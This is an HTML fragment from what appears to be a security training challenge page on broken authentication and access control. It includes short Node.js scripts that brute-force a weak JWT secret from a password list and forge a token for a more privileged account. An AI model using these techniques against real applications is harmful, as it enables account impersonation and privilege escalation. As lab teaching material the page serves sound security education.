<h5>About the vulnerabilities</h5>
<p>
   <strong>Identification and Authentication failures</strong> include session identifiers that can be compromised, missing cookie headers and brute force attacks on passwords.<br>
   
   The <strong>Broken Access Control</strong> category includes 
   authorization flaws, privilege escalation, reliance on client side and path traversal flaws.<br>

<h5>Challenge Tips and Tricks</h5>
<p>
    In the previous challenge you have broken into the test account. In this challenge you must perform an authorization attack by changing
    from the test account to one of the hackers' accounts. You can achieve that by attacking the session identifier. The JWT token is stored in the browser session storage.
    <br> <br>
    The application is using JWT for authentication. JWT contains a JSON object signed with a secret or RSA private key in the best cases.
    Getting a hold of the JWT secret can prove devastating because attackers can impersonate anyone and can generate 'eternal' session identifiers
    (which never expire).
    The JWT secret in this case is very weak so you can easily crack it by writing a script that tries some of the most insecure passwords.
    <br> <br>
    In Node.JS you can use a script like this to verify a bunch of secrets:
    <pre class="pre-scrollable">
        const jwt = require('jsonwebtoken');
        var token = "ENTER_THE_TOKEN";
        var secrets = ["passw0rd","secret","1234"];
        //if you're looking for secrets there's a good list here: https://www.theregister.co.uk/2010/01/21/lame_passwords_exposed_by_rockyou_hack/
        for(var secret of secrets){

            jwt.verify(token, secret, function(err, decoded) {
                if (!err) {
                    console.log('authorized:', decoded);
                }
            });

        };
    </pre>

    Pay attention to the structure of the decoded test account. Change the properties of the javascript object to an account with more permissions. 

    <br>
    In Node.JS you can generate JWT tokens with a script like this:
    <pre class="pre-scrollable">
            const jwt = require('jsonwebtoken');
            var token = jwt.sign(userObject, "SECRET");
            console.log(token);
    </pre>
